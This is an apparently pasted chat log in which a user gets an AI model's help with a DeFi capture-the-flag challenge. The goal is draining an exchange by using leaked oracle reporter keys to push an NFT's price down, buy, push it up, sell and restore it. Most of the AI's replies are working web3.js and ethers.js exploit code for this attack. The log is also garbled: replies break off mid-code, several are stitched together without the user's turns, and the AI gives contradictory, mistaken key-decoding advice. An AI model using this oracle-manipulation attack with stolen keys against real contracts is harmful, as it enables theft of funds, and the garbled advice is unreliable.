A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.

Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.

This is an interesting scenario and challenge. You are facing two smart contracts, an Oracle, and an Exchange. The Oracle smart contract (TrustfulOracle) is used to compute the median price of the "DVNFT" tokens from three trusted sources. The Exchange smart contract (Exchange) uses this median price to sell and buy "DVNFT" tokens.

Given the information provided, I see a potential vulnerability in these contracts. This vulnerability is related to the ability to manipulate the prices provided by the oracle.

In the TrustfulOracle contract, there is a postPrice function which allows trusted sources to update the price of a given symbol. The price is then used to calculate the median price of the "DVNFT" tokens.

The challenge suggests that you only have 0.1 ETH and the tokens are priced at 999 ETH each, making it impossible for you to buy them directly. However, if you can change the prices reported by the oracle to make the median price fall within your balance, you could buy a token.

Firstly, the strange response you've received from the server seems to be encoded in hexadecimal. Converting these hex strings into ASCII might reveal some important information:

The nature of the challenge suggests that these may be the private keys for the addresses of the trusted reporters of the Oracle. If this is the case, you could use these keys to make the trusted reporters post lower prices, causing the median price to fall within your 0.1 ETH balance. Then, you could buy a "DVNFT" token from the Exchange. After that, you could resell the token at the original price
User
can you give a code example that using those private keys  make the trusted reporters post lower prices, causing the median price to fall within your 0.1 ETH balance. Then,  buy a "DVNFT" token from the Exchange. After that, esell the token at the original price
ChatGPT

The example I am providing is a high-level outline and pseudocode. It assumes that you have control over a smart contract or a script that can manage transactions for the addresses linked to the provided private keys. Actual implementation would require you to use a development environment like Truffle or Hardhat.

As I explained before, I suspect that the hexadecimal strings you provided are encrypted private keys for the addresses of the oracle's trusted sources. If that's the case, and you're able to decrypt them, then you could use those keys to make transactions from those addresses.

Firstly, you would decode the provided hexadecimal strings to see if they are indeed the private keys for the reporters. If you can do this, you would then generate the Ethereum accounts using those keys. Here's how you could do that using web3.js:

javascript

const Web3 = require('web3');
const web3 = new Web3("http://localhost:8545"); // or connect to a mainnet node

const privateKey1 = web3.utils.hexToAscii('0x...' /* first hex string */);
const account1 = web3.eth.accounts.privateKeyToAccount(privateKey1);

// Repeat for the other two keys

const privateKey2 = web3.utils.hexToAscii('0x...' /* second hex string */);
const account2 = web3.eth.accounts.privateKeyToAccount(privateKey2);

const privateKey3 = web3.utils.hexToAscii('0x...' /* third hex string */);
const account3 = web3.eth.accounts.privateKeyToAccount(privateKey3);

Then, you would use these accounts to post a new, lower price to the oracle:

javascript

const newPrice = web3.utils.toWei('0.05', 'ether'); // half of your balance
const gasLimit = 500000; // adjust according to the actual gas cost of the transaction

const oracleContractAddress = '0x...' /* TrustfulOracle contract address */;
const oracleContractABI = [ /* ABI array of the TrustfulOracle contract */ ];
const oracle = new web3.eth.Contract(oracleContractABI, oracleContractAddress);

const reporters = [account1, account2, account3];
for (let reporter of reporters) {
  const postPriceTx = {
    to: oracleContractAddress,
    data: oracle.methods.postPrice("DVNFT", newPrice).encodeABI(),
    gas: gasLimit,
  };

  const signedTx = await reporter.signTransaction(postPriceTx);
  web3.eth.sendSignedTransaction(signedTx.rawTransaction);
}

After manipulating the oracle's prices, you would buy a "DVNFT" token from the exchange contract:

javascript

const exchangeContractAddress = '0x...' /* Exchange contract address */;
const exchangeContractABI = [ /* ABI array of the Exchange contract */ ];
const exchange = new web3.eth.Contract(exchangeContractABI, exchangeContractAddress);

const buyOneTx = {
  to: exchangeContractAddress,
  value: web3.utils.toWei('0.1', 'ether'),
  data: exchange.methods.buyOne().encodeABI(),
  gas: gasLimit,
};

// Assuming `yourAccount` is the Ethereum account you're using for the challenge
const signedBuyOneTx = await yourAccount.signTransaction(buyOneTx);
web3.eth.sendSignedTransaction(signedBuyOneTx.rawTransaction);

Finally, you would resell the token back to the exchange at the original price:

javascript

// Assuming you've obtained the token's ID somehow (e.g., from the TokenBought event)
const tokenId = '0x...' /* Token's ID */;

const sellOneTx = {
  to: exchangeContractAddress,
  data: exchange.methods.sellOne(tokenId).encode

User
I am not ganing anything
ChatGPT

I apologize for misunderstanding your question earlier. In the scenario you described, indeed, buying a token and then reselling it would not yield any profit if the price is the same for both transactions.

To generate a profit, you would need to buy the token at a lower price and then resell it at a higher price. Given the TrustfulOracle setup, you could use the decrypted private keys to manipulate the price lower, buy the token, then manipulate the price higher, and sell the token. But to make sure you profit, the price must be higher when you sell the token than when you bought it.

Here's how you could do that:

    Lower the price with the oracle's trusted reporters, similar to the earlier step.
    Buy the "DVNFT" token from the exchange contract.
    Raise the price with the oracle's trusted reporters.
    Sell the "DVNFT" token back to the exchange contract.

Step 3 would look like this:

javascript

// This time we set a higher price
const highPrice = web3.utils.toWei('2000', 'ether'); // for example, twice the original price

// Post the higher price with each reporter
for (let reporter of reporters) {
  const postHighPriceTx = {
    to: oracleContractAddress,
    data: oracle.methods.postPrice("DVNFT", highPrice).encodeABI(),
    gas: gasLimit,
  };

  const signedHighPriceTx = await reporter.signTransaction(postHighPriceTx);
  web3.eth.sendSignedTransaction(signedHighPriceTx.rawTransaction);
}

Then proceed with Step 4, which would be the same as the sell step in the earlier example.

Remember to check that the exchange contract has enough ETH balance to buy the token back at the higher price. If it doesn't, then you'll need to add ETH to it somehow or adjust the prices accordingly. Be aware that this method, like any other form of price manipulation or market abuse, is highly unethical and likely illegal in a real-world setting. This discussion is purely hypothetical and intended for learning purposes only.
User

the  NFT price should be the same at the beggining and at the end, can you provide some code to restore the nft initial value at the end of the attack?
ChatGPT

Sure, in order to restore the original price at the end of the operation, you can simply make the trusted reporters post the initial price back to the oracle.

Let's assume the initial price was 999 ETH, you can restore it after selling the token:

javascript

// Assuming the initial price was 999 ETH
const initialPrice = web3.utils.toWei('999', 'ether');

// Post the initial price with each reporter
for (let reporter of reporters) {
  const postInitialPriceTx = {
    to: oracleContractAddress,
    data: oracle.methods.postPrice("DVNFT", initialPrice).encodeABI(),
    gas: gasLimit,
  };

  const signedInitialPriceTx = await reporter.signTransaction(postInitialPriceTx);
  web3.eth.sendSignedTransaction(signedInitialPriceTx.rawTransaction);
}

This code will restore the price back to its initial value, assuming that the reporters' reports are the only ones affecting the median price. Please note that in a real-world situation, there might be other reporters also posting prices, which could impact the median price even after you've posted the original price.

Again, I need to stress that manipulating prices, especially when having access to privileged accounts, is unethical and likely illegal in real-world scenarios. This example is purely for educational purposes in the context of your question.
User

there is only 2 strings to use as keys can you modify the code to reflect that?
ChatGPT

Apologies for the misunderstanding earlier. Let's correct that and use only two keys.

The string values you provided in the HTTP response are hexadecimal representations. You need to first convert these strings into readable text, which will give you the actual private keys. After you have these private keys, you can import them as accounts into web3.

Let's assume the first string 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 is key1 and the second string 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 is key2.

Then you can use the same approach as before, but this time only with these two accounts:

javascript

const key1 = 'MHhjNjc4ZWYxYWE0NTZkYTU1NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5';
const key2 = 'MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVmMjM1NDdhY2JlZmZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4';

// Import the private keys as accounts in web3
const account1 = web3.eth.accounts.privateKeyToAccount(key1);
const account2 = web3.eth.accounts.privateKeyToAccount(key2);

// Collect these accounts into a reporters array
const reporters = [account1, account2];

// Now you can use these accounts to sign and send transactions to post prices as in the previous examples

Note that I have
User
is there a way to do that with the ethers library?
ChatGPT

Yes, you can achieve the same thing using the ethers.js library, which is an alternative to web3.js. Here is an example using ethers.js:

First, you need to import the ethers library and instantiate the providers and the signer:

javascript

const ethers = require('ethers');

const provider = new ethers.providers.JsonRpcProvider('http://localhost:8545'); // Change with your provider

Then, you can create wallets using the private keys:

javascript

// Convert hex string to ASCII
const privateKey1 = ethers.utils.toUtf8String('0x' + '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35');
const privateKey2 = ethers.utils.toUtf8String('0x' + '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34');

const wallet1 = new ethers.Wallet(privateKey1, provider);
const wallet2 = new ethers.Wallet(privateKey2, provider);

Next, instantiate the Oracle and Exchange contract instances:

javascript

const oracleContract = new ethers.Contract(oracleContractAddress, oracleAbi, wallet1); // wallet1 is used as signer
const exchangeContract = new ethers.Contract(exchangeContractAddress, exchangeAbi, wallet1);

Finally, use these wallets to sign and send transactions to post new prices, buy the NFT, sell it and restore the price:

javascript

const newPrice = ethers.utils.parseEther('0.1'); // lower price in ETH

async function runAttack() {
    // Post new price using each reporter wallet
    for (let wallet of [wallet1, wallet2]) {
        const signer = oracleContract.connect(wallet);
        await signer.postPrice("DVNFT", newPrice);
    }

    // Buy a DVN

Apologies for the confusion earlier, and thank you for pointing out the issue.

It appears that I misunderstood your question, assuming those strings are hexadecimal representations of private keys. If these are actually private keys, they should be provided in a proper format without spaces.

If those strings are actual hexadecimal private keys, you can import them directly without any transformation like this:

javascript

Please replace the provider URL with your actual Ethereum provider URL (could be a local Ethereum node, or a service like Infura or Alchemy).

Note: In a production environment, be sure to manage private keys securely. They should not be hard-coded into your program as in this example, but instead stored in a secure and encrypted manner. You should also handle them with environment variables or secure secret management systems.

Apologies for the confusion. The issue is with interpreting the provided hexadecimal strings.

In your initial request, the hexadecimal strings provided appear to be ASCII hex representation. It seems they need to be converted from hex to ASCII to be used as a private key. Here is a way to do that:

javascript

const ethers = require('ethers');

const provider = new ethers.providers.JsonRpcProvider('http://localhost:8545'); // Change with your provider

const hexToAscii = (hexString) => {
    let asciiString = '';
    for (let i = 0; i < hexString.length; i += 2) {
        asciiString += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
    }
    return asciiString;
};

It seems there is some confusion about the provided hexadecimal strings. It looks like these strings may be base64 encoded strings rather than hexadecimal private keys.

Here is how to decode a base64 string into a hexadecimal string which can then be used to generate an Ethereum private key:

javascript

const ethers = require('ethers');

const provider = new ethers.providers.JsonRpcProvider('http://localhost:8545'); // Change with your provider

// Function to convert base64 to hex
function base64ToHex(str) {
    const raw = atob(str);
    let result = '';
    for (let i = 0; i < raw.length; i++) {
        const hex = raw.charCodeAt(i).toString(16);
        result += (hex.length === 2 ? hex : '0' + hex);
    }
    return result;
}

const base64String1 = 'MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5';

const privateKeyHexString1 = base64ToHex(base64String1);
const privateKeyHexString2 = base64ToHex(base64String2);

const wallet1 = new ethers.Wallet(privateKeyHexString1, provider);
const wallet2 = new ethers.Wallet(privateKeyHexString2, provider);

// Further actions using these wallets...

Please replace the provider URL with your actual Ethereum provider URL.

If this approach also doesn't work, there may be some misunderstanding or error regarding the interpretation of the provided strings. You should confirm the format and contents of the provided keys.

If the error persists, it would be advisable to contact the party that provided these keys and seek clarification about their format and usage.

I'm sorry for the confusion. It seems I made a mistake in understanding the nature of the string you've shared. The initial prefix '0x' that is appended to your string suggests it's already in hexadecimal format. It's just encoded with base64 and needs to be decoded before constructing the private key.

Try using the following approach:

javascript

const ethers = require('ethers');

const provider = new ethers.providers.JsonRpcProvider('http://localhost:8545'); // Change with your provider

// Base64 to Hex
function base64ToHex(str) {
    const raw = atob(str);
    let result = '';
    for (let i = 0; i < raw.length; i++) {
        const hex = raw.charCodeAt(i).toString(16);
        result += (hex.length === 2 ? hex : '0' + hex);
    }

I'm sorry for the confusion. The error you're seeing typically occurs when the format or length of the private key is incorrect. Ethereum private keys should be 64 hexadecimal characters (32 bytes) long.

The issue here might be with the base64 to hexadecimal conversion function, or the original strings may not be correctly formatted private keys.

Try replacing the base64ToHex function with the following code which should properly handle base64 encoded private keys:

javascript

function base64ToHex(str) {
    let bin = Buffer.from(str, 'base64').toString('binary');
    let result = '';
    for (let i = 0; i < bin.length; i++) {
        result += ('0' + bin.charCodeAt(i).toString(16)).slice(-2);
    }
    return '0x' + result;
}

This function uses Node.js built-in Buffer to handle base64 to hex conversion which should handle the private keys correctly.

It seems like there might be a misunderstanding on the data format you provided. The hex string you're trying to decode does not represent a base64 encoded string, it's actually hexadecimal representation of ASCII values.

You should convert these hexadecimal values to ASCII first. After that you'll get a base64 string that you can convert to a private key.

Here's how to convert hex to ASCII in Javascript:

javascript

function hexToAscii(hexString){
    let asciiString = '';
    for (let i = 0; i < hexString.length; i += 2) {
        asciiString += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
    }
    return asciiString;
}

// Now let's convert the hexadecimal strings to ASCII
let key1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";

Let's do it step by step:

    Your input is a hexadecimal representation of ASCII values.

    Convert the hexadecimal representation to ASCII. This should give us a string that represents a base64 encoded value.

    Decode the base64 encoded string. This should give us a byte array that represents the private key.

Here's how to do that:

const ethers = require("ethers");

function hexToAscii(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
        str += String.fromCharCode(parseInt(hex.substring(i, i+2), 16));
    }
    return str;
}

function base64ToHex(str) {
    const raw = atob(str);
    let result = '';
    for (let i = 0; i < raw.length; i++) {
        const hex = raw.charCodeAt(i).toString(16);
        result += (hex.length === 2 ? hex : '0' + hex);

// Now you should have valid private keys

It seems there's a misunderstanding regarding the key formatting. Based on the error message, the private key is not being accepted because it's not correctly formatted. Ethereum private keys must be 32 bytes in length. Also, remember that Ethereum private keys should be kept secret and not shared.

If your keys are hexadecimal encoded strings, they should start with '0x' and be exactly 64 characters long after that (for a total of 66 characters including the '0x'). This is because each byte is represented by 2 hex characters, and an Ethereum private key is 32 bytes long.

It seems like your input is not a valid private key in hexadecimal representation. A correct private key in hex form should look something like this:

js

'0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'

This is a valid Ethereum private key.

You can't directly convert an arbitrary string to a valid private key. The key must be generated in a way that is compatible with the Ethereum protocol.

If you have a Base64 encoded private key, you should first decode it into a Buffer, then convert it to a hex string:

js

const base64Key = "yourBase64EncodedKey";
const buffer = Buffer.from(base64Key, 'base64');
const hexKey = '0x' + buffer.toString('hex');

const wallet = new ethers.Wallet(hexKey);

This will work if 'yourBase64EncodedKey' is a Base64 encoded representation of a valid Ethereum private key.

But if your string 'MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5' is not a valid Base64 encoded Ethereum private key, then it cannot be used to create a Wallet instance. It will result in an error like the one you are seeing.

it should be valid
ChatGPT

Based on the error messages you're receiving and the fact that you've affirmed that the private keys should be valid, it's likely that there's a misinterpretation of the key format happening.

It seems that you're providing the private key in a format that begins with 0x and then the rest of the key. However, the key is encoded in a string that starts with 'MH'. This indicates that the key is Base64URL encoded and not directly in hexadecimal.

Here's a method to correctly convert your private key from Base64URL to a hexadecimal string:

javascript

// npm install base64url
const base64url = require('base64url');

// Your Base64URL encoded private key
let privateKeyBase64Url = "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5";

// Decode Base64URL to Base64
let privateKeyBase64 = base64url.toBase64(privateKeyBase64Url);

// Decode Base64 to Buffer
let privateKeyBuffer = Buffer.from(privateKeyBase64, 'base64');

// Convert Buffer to Hex
let privateKeyHex = '0x' + privateKeyBuffer.toString('hex');

console.log(privateKeyHex);

Please replace "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5" with your actual private key. This should give you the correctly formatted private key, which you can then use to instantiate the ethers Wallet as per the earlier examples.

ChatGPT

It appears that you are still facing the same error related to the private key validation. I believe there might be some confusion around the way we are dealing with the keys.

The private keys for Ethereum are usually 32 bytes long (64 hexadecimal characters). However, sometimes they can be expressed with a '0x' prefix to indicate that they are hexadecimal, which is common in the Ethereum community.

If your private key starts with "MHh", this indicates it's Base64URL encoded. We have been treating it as if it was a hexadecimal string, which might be causing the issue.

Here's how you can correctly handle this situation:

    First, decode the Base64URL string to get the raw private key.
    Then, handle this raw private key accordingly in the Ethers.js library.

Here's the code you would use to accomplish this:

javascript

const base64url = require('base64url');

// Base64URL encoded private key
let encodedPrivateKey1 = "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5";
let encodedPrivateKey2 = "YOUR_SECOND_PRIVATE_KEY";

// Decode the private key
let rawPrivateKey1 = base64url.decode(encodedPrivateKey1);
let rawPrivateKey2 = base64url.decode(encodedPrivateKey2);

// Now, use the raw private key to create a Wallet instance
let wallet1 = new ethers.Wallet(rawPrivateKey1);
let wallet2 = new ethers.Wallet(rawPrivateKey2);

// Continue with the rest of your code...

Please replace "YOUR_SECOND_PRIVATE_KEY" with your second private key. You should be able to avoid the INVALID_ARGUMENT error with this approach.

However, please note that sharing private keys is inherently insecure. Ensure that you're using this code in a secure and private environment, and never share your private keys with anyone or any site that you do not absolutely trust.

It appears that your private key string contains invalid characters that are not hexadecimal digits. These non-hexadecimal characters are shown as �, suggesting that the input might have been corrupted or incorrectly formatted.

The private keys for Ethereum should only consist of hexadecimal characters (0-9 and a-f). If there are any characters outside of this range, the private key is considered invalid.

If you are confident that your private key was correctly generated and stored, then this error may be the result of a copy-paste issue, encoding problem, or file corruption.

Please double-check your private key. It should be a 64-character hexadecimal string. If it is not, and you don't have the correct private key stored somewhere else, then you may be unable to use that Ethereum account.

As a side note, private keys need to be kept secret. If your private key is compromised, anyone with the key can access and control your Ethereum account. Please avoid sharing private keys when possible and store them securely.

} catch (error) {
  console.log('Error:', error);
}

In this example, JsonRpcProvider() and getSigner() are placeholders, you should replace them with your provider and signer respectively.

parseEther('0.1') is equivalent to web3.utils.toWei('0.1', 'ether').

exchange.buyOne({ value: valueToSend }) is equivalent to using encodeABI() to create the data for the transaction in web3.js.

Note that, unlike web3.js, ethers.js automatically estimates the gas limit for transactions, so you do not need to manually set it unless you have a specific reason to do so.

Also, remember to replace '0x...' with the actual address of the exchange contract and [ /* ABI array of the Exchange contract */ ] with the actual ABI of the exchange contract.

how do I get the tokenId after buying the nft?
ChatGPT

Assuming that the contract emits an event that logs the newly minted NFT's ID, you can retrieve the ID from the transaction receipt. Most NFT contracts emit a Transfer event when a token is transferred or minted.

Here's a rough example:

javascript

const ethers = require('ethers');

// ... your setup code

const buyOneTx = await exchange.buyOne({ value: valueToSend });

// Wait for the transaction to be mined and get the receipt
const receipt = await buyOneTx.wait();

// The Transfer event from ERC721 contracts usually have the following topics:
// 0: event signature
// 1: from address (0x0000000000000000000000000000000000000000 for minting)
// 2: to address
// 3: token id

// Assuming that your contract emits an ERC721 Transfer event upon minting
let tokenId;
receipt.events.forEach(event => {
    if (event.event === 'Transfer') {
        tokenId = event.args[2].toString();
    }
});

console.log(`Minted token ID: ${tokenId}`);

Please note that you have to replace 'Transfer' with the exact event name if it's different in your NFT contract. Additionally, the event.args array structure can be different based on the event emitted by the contract, you may need to adjust the index accordingly.

when trying to sell the nft it says  Error: VM Exception while processing transaction: reverted with custom error 'TransferNotApproved()'
ChatGPT

This error is due to the contract requiring that the owner of the NFT approve the transfer before it can be executed. This is a standard feature of ERC721 contracts, which is the most common NFT standard.

To overcome this, you'll need to call the approve function on the NFT contract, approving the exchange to transfer the NFT on your behalf.

Here is an example:

javascript

const ethers = require('ethers');

// ... your setup code ...

// Assume you have the contract instance and the exchange address
// 'tokenId' is the id of the token that you want to sell

await nftContract.approve(exchangeContractAddress, tokenId);

// Then you can execute the sell transaction
let sellTx = await exchange.sellOne(tokenId);

// Wait for it to be mined
let receipt = await sellTx.wait();

// Verify the result...

In this code snippet, it is assumed that the nftContract variable is an instance of the NFT contract that you interact with, created in a similar manner to the exchange instance.

This will allow the exchange contract to transfer the token out of your wallet. After this, you should be able to sell the NFT. Remember to replace exchangeContractAddress and tokenId with the actual values.
